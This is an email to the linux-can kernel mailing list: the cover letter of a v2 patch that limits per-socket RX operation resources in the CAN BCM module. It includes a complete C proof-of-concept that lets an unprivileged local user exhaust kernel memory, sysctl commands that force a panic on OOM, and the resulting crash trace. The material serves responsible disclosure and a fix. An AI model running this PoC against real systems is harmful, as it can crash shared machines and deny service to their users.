Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.216.47
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1793195013;
	b=ZYdk3QKBctG0oyolf4o4EzkWqNKAnZF/N+YgzXRTwjhIvOwDz51AZwGM+uErMQ+NWvvo
	 2fvrk48/2b2EOWqNz6mY8tIS9vLS77GgGfYNOBBo8Xi82muCFNRHGZf4SCSaROi3qiHk6
	 BeXA9M7dpnTakd/Wjh494+Y4ihG5jUm10auW+63I+GdJg4r5mNB9M7pwy9AVako/i7Jmz
	 h4eKT3B0hhJji0d/KHbgruBI6ZhK4Fn15L1M+7RmfarlEpXLLvDkuY678fkMpFYKMkR4k
	 Ujrb9kz1WgC7UNlMAxZjyxhb2k7iQOQCwYaGA9ZbxSA+x16Cmmv9rUQ2U+QUBcv7/vA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1793195013;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:In-Reply-To:References:MIME-Version:
	 Content-Transfer-Encoding;
	bh=Btc/bv4Uux02dRmT8suUtucQEA//n3C3kGDQ80rhPlk=;
	b=U10A6QxuEiP99QSEFbPK6bfMyJnUr3Rm0VHxvC+AVds7RZoTCQT74+lbQ/X38txEhV/z
	 8iP86e+ExqKt0XSR+iktVfDeIW4kG8lYq9G9yUMnvsbgqTBZ9v/1FyfoZPITl401VCjtt
	 9RNw2b8pbOyntL+fK9zyr52xgqr3w69E06J7LOnsi4eVgX2ttpfqpUcze9A65vLQT84gb
	 dIWaUZXocQl2n0XT4IOUkflSyxw0D4iy6w+XabMrl/lEoZEgUzzXyAOn5XCy/F5trrdY5
	 Bhl9XRiKQLA2+S4KnqtSsxUIp8toTI8Grgwd7EIvi4N8glDHAInhic9P+sq600s54xg==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=IUOkmGXe;
	arc=none smtp.remote-ip=209.85.216.47
Received: from mail-pj1-f47.google.com (mail-pj1-f47.google.com [209.85.216.47])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 81F8C606A31A
	for <linux-can@vger.kernel.org>; Wed, 28 Oct 2026 13:43:32 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 81F8C606A31A
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=IUOkmGXe
Received: by mail-pj1-f47.google.com with SMTP id 98e67ed59e1d1-3ac7842c17dso625784a91.3
        for <linux-can@vger.kernel.org>; Wed, 28 Oct 2026 06:43:32 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1793195012; x=1793799812; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=Btc/bv4Uux02dRmT8suUtucQEA//n3C3kGDQ80rhPlk=;
        b=IUOkmGXeJzLDniVUHBlPjBTMVOoKDcbnHUFkjQKLaPpQK7ZnpMwFLhdC4GJOKjSJvc
         5lceV4c2CKT584UbnV6Ati1/yh3lZKqm4Tc1fvdpbqQ/LbiEirM7qV801GcIUc6nk9gf
         PLIbGIwjunLwjcw+3yxG3YyTWI6/rP4Gy90ZBwjuh7ihZN4ZyLHszlcs78wNQSe+q4DZ
         XwOFiiTuPJUyB5FtImbk5nnxMRPXbTF4Pcu5xtW3MCNkqNwVxyw8pt31I7H5hZPi6gup
         3m0mNM4g4RUQ3vmAn34Y25617eZ5Q0o7pMSKiwZMf7cR0G0iPAUsETuv2842HupGylBR
         elUA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1793195012; x=1793799812;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to:content-type;
        bh=Btc/bv4Uux02dRmT8suUtucQEA//n3C3kGDQ80rhPlk=;
        b=MY92RkrbVf0l60D8zGtDyCThjJHJhZNPfgHNfrPvjWc5807Iri0U10L+XlbFFr2ac+
         KOtJgXBF8zbOvFwARwF8gAaUdkM/UY7ZhSV1HoaGjCJjbPXHUyZ6dq0ReZveTOfikuuW
         KnwGyJbcV8jzQjZvC0Qtrt6gfM6W3dLaPwCOGXeeHNjyPa8jNfwdsGFFZs+N2UdbyRHX
         eE3G36Sm6VEagBJtCta28A0DkY31E5Lv0+NMQK1ckp+QORNy8GBOD2Q06yF7A2zKuN4x
         H/Czkzdy7Om7JBpTqDuv2M8hpIbvJXYOKfbRGzoIDBLAoy/7UTGHrqWYmat7cAkU7/d7
         AI4g==
X-Gm-Message-State: AFq9FYKizZHBnx/e84Q7jZUxnPJjidhe124fQ6zTkwXXtKFXr0DyzDLO
	VRiNOLwO9YMznjC8DddFhqONORbN68xd4ormBE6MMLt15lwet9kSYJmqNSluIcW1WF1xOGK+Yj2
	MFOsFcA==
X-Gm-Gg: AYBFou0KcSr8Y/q9EM7k2GgGMxpsJQ1E4iPQwW8TOV8jWTS5ZOodY1L7dqCS2hxAmZu
	5JEZgu5+mDxPE5BNK7SkemuPWXlwDIlbcucSfWUAewNJw9WnWRDGODMbg1LSBPzuvMZ+DfIkg8B
	V7znp5ns94TBHtYA4Mmp58sCbAtqzbhP2eW0fpscNAVujni55oV14HGGG6qX284+WKYp9kVF/mf
	RkQN8GWbglKTob6+PuY2+F7h8nQpyLzycMtPusuPSo6Zz5az+B4JcSfyxK4JJGaNyQeKyFh6nkH
	iiiBREfwef8IHupnMOUfwdSj4ccc416gkzZdFDjf1FsR4ggTSph5mDHtnRbgVkaHRubJmqk5WYc
	fJIim61etmW3XM3nAcUSVfTId+UGe5brF+sEl9FLo8CJoPLK672VBM+BJM6bPr3XW3p6mCsXzQH
	rdVqv10RUNoaPIqMmOK68IOsTKdKyjAQwd+7jc6NSxzD3gvA5A9iPO0gBoJtB9XujW5LeDohVxO
	rjIbTo9wCs87aCoMvSNUUdFH4DwS3k6pd/R59Sl9Os21FD1GEzw8GJAGiO6FiaYYAudrxmp4twz
	tsqKSedKmgxEiwjj4kA8Cv3aZj0wWVJjmhjkTQ+tZrb6ICeLk3omsP2Kxbe1L8pw/RNYL1riM3T
	wsPQ3rg==
X-Received: by 2002:a17:90b:1647:b0:3ac:452b:4a63 with SMTP id 98e67ed59e1d1-3ae582cdd4emr1704958a91.55.1793195011425;
        Wed, 28 Oct 2026 06:43:31 -0700 (PDT)
Received: from 24c857d0c3be.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3ae5a941a8bsm3179875a91.6.2026.10.28.06.43.28
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 28 Oct 2026 06:43:30 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: linux-can@vger.kernel.org,
	mkl@pengutronix.de,
	socketcan@hartkopp.net
Cc: urs.thuermann@volkswagen.de,
	davem@davemloft.net,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net v2 0/1] can: bcm: bound per-socket RX operation resources
Date: Wed, 28 Oct 2026 13:43:24 +0000
Message-ID: <cover.1793109154.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
In-Reply-To: <cover.1793089479.git.zihanx@nebusec.ai>
References: <cover.1793089479.git.zihanx@nebusec.ai>
X-Mailing-List: linux-can@vger.kernel.org
List-Id: <linux-can.vger.kernel.org>
List-Post: <mailto:linux-can@vger.kernel.org>
List-Help: <mailto:linux-can+help@vger.kernel.org>
List-Subscribe: <mailto:linux-can+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-can+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-can+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found an issue in net/can/bcm.c.
The bug is reachable by an unprivileged local user.
The relevant details are provided below.

---- details below ----

An LLM was used to help create this patch.

This bug is tracked at: https://bugtracker.nebusec.ai/f/11134 (11134)

Bug details:

bcm_rx_setup() limits frames in one operation but not the number of
operations attached to a socket. Distinct CAN IDs create distinct
operations; with ifindex 0, a local unprivileged process needs no CAN
device. CAN-FD operations allocate frame arrays and CAN receiver
objects outside socket buffer accounting, allowing repeated requests
to consume kernel memory.

Limit each socket to 1024 RX operations/receivers and 16 MiB of BCM
operation and frame-array allocations. Keep operation charges until
the operation is freed, and receiver charges until CAN-core RCU
reclamation frees each receiver. Reject requests over the limits with
-ENOBUFS.

Changes in v2:

Set the error to -ENOMEM when either RX frame-array allocation fails,
before entering the common cleanup path. This ensures the send syscall
reports the allocation failure instead of returning success. Both
frame-array allocation failure paths were exercised with guest
fail_page_alloc injection.

Reproducer:

Build the included PoC source with:

    cc -O2 -Wall -Wextra -o poc poc.c

In the guest's initial user and network namespaces, as root, configure
OOM panic to capture the crash:

    echo 0 > /proc/sys/kernel/panic_on_warn
    echo 2 > /proc/sys/vm/panic_on_oom
    echo 0 > /proc/sys/vm/oom_kill_allocating_task

Then, as the unprivileged guest user test_user (UID 1001), run:

    ./poc 0 1000

No namespace setup, added capabilities, or CAN device is required; the
socket uses ifindex 0. Root is used only to set the OOM sysctls.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN PoC------

#define _GNU_SOURCE

#include <errno.h>
#include <inttypes.h>
#include <linux/can.h>
#include <linux/can/bcm.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define BCM_NFRAMES 257U
#define DEFAULT_PROGRESS_STEP 1000U

struct rx_setup_req {
	struct bcm_msg_head head;
	struct canfd_frame frames[BCM_NFRAMES];
};

static void die(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static unsigned long parse_ul(const char *arg, const char *name)
{
	char *end = NULL;
	unsigned long value;

	errno = 0;
	value = strtoul(arg, &end, 0);
	if (errno || !end || *end != '\0') {
		fprintf(stderr, "invalid %s: %s\n", name, arg);
		exit(EXIT_FAILURE);
	}

	return value;
}

int main(int argc, char **argv)
{
	unsigned long max_ops = 0;
	unsigned long progress_step = DEFAULT_PROGRESS_STEP;
	unsigned long hold_seconds = 0;
	struct sockaddr_can addr = {
		.can_family = AF_CAN,
		.can_ifindex = 0,
	};
	struct rx_setup_req *req;
	size_t req_len;
	unsigned long i;
	int fd;

	if (argc > 1)
		max_ops = parse_ul(argv[1], "max_ops");
	if (argc > 2)
		progress_step = parse_ul(argv[2], "progress_step");
	if (argc > 3)
		hold_seconds = parse_ul(argv[3], "hold_seconds");
	if (!progress_step)
		progress_step = DEFAULT_PROGRESS_STEP;

	req = aligned_alloc(8, sizeof(*req));
	if (!req)
		die("aligned_alloc");

	memset(req, 0, sizeof(*req));
	req->head.opcode = RX_SETUP;
	req->head.flags = CAN_FD_FRAME;
	req->head.nframes = BCM_NFRAMES;

	for (i = 0; i < BCM_NFRAMES; i++) {
		req->frames[i].len = CANFD_MAX_DLEN;
		memset(req->frames[i].data, (int)i, sizeof(req->frames[i].data));
	}

	req_len = sizeof(*req);

	fd = socket(PF_CAN, SOCK_DGRAM, CAN_BCM);
	if (fd < 0)
		die("socket(PF_CAN, SOCK_DGRAM, CAN_BCM)");

	if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("connect(AF_CAN, ifindex=0)");

	for (i = 0; !max_ops || i < max_ops; i++) {
		ssize_t written;
		uint32_t id = (uint32_t)((i + 1) & CAN_EFF_MASK);

		req->head.can_id = CAN_EFF_FLAG | id;

		written = send(fd, req, req_len, 0);
		if (written < 0) {
			fprintf(stderr,
				"send failed after %lu RX_SETUP operations: %s\n",
				i, strerror(errno));
			return EXIT_FAILURE;
		}

		if ((i + 1) % progress_step == 0) {
			fprintf(stderr,
				"installed=%lu bytes_per_req=%zu total_payload=%" PRIu64 "\n",
				i + 1, req_len, (uint64_t)(i + 1) * req_len);
		}
	}

	fprintf(stderr, "completed %lu RX_SETUP operations without send failure\n",
		i);
	if (hold_seconds) {
		fprintf(stderr, "holding socket open for %lu seconds\n",
			hold_seconds);
		sleep(hold_seconds);
	}
	return EXIT_SUCCESS;
}

------END PoC--------

----BEGIN crash log----

The stack below is decoded with source locations from the DWARF5,
reduced-debug-info build. The guest OOM was triggered during
`bcm_sendmsg()` allocation at `net/can/bcm.c:1431`.

[   95.493290][ T9374] poc invoked oom-killer: gfp_mask=0x40cc0(GFP_KERNEL|__GFP_COMP), order=3, oom_score_adj=0
[   95.493324][ T9374] Call Trace:
[   95.493466][ T9374]  dump_header (mm/oom_kill.c:464)
[   95.493544][ T9374]  out_of_memory (mm/oom_kill.c:1075 mm/oom_kill.c:1143)
[   95.493555][ T9374]  ? __pfx_out_of_memory (mm/oom_kill.c:835)
[   95.493567][ T9374]  __alloc_frozen_pages_noprof (mm/page_alloc.c:4113 mm/page_alloc.c:5030 mm/page_alloc.c:5449)
[   95.493636][ T9374]  ? __pfx___alloc_frozen_pages_noprof (mm/page_alloc.c:4022)
[   95.493866][ T9374]  __kmalloc_noprof (mm/slub.c:5402 mm/slub.c:5439)
[   95.493899][ T9374]  ? bcm_sendmsg (include/linux/slab.h:995 include/linux/slab.h:1211 net/can/bcm.c:1431 net/can/bcm.c:1739)
[   95.493920][ T9374]  bcm_sendmsg (include/linux/slab.h:995 include/linux/slab.h:1211 net/can/bcm.c:1431 net/can/bcm.c:1739)
[   95.493933][ T9374]  ? __pfx_bcm_sendmsg (net/can/bcm.c:528)
[   95.493971][ T9374]  __sys_sendto (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2281 (discriminator 1))
[   95.494018][ T9374]  ? __pfx_bcm_sendmsg (net/can/bcm.c:528)
[   95.494027][ T9374]  ? __pfx___sys_sendto (net/socket.c:2235)
[   95.497355][ T9374] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled

-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  can: bcm: limit RX operation resource usage per socket

 include/linux/can/core.h |   7 +++
 net/can/af_can.c         |  34 ++++++++++-
 net/can/af_can.h         |   1 +
 net/can/bcm.c            | 127 +++++++++++++++++++++++++++++++++------
 4 files changed, 147 insertions(+), 22 deletions(-)

-- 
2.43.0

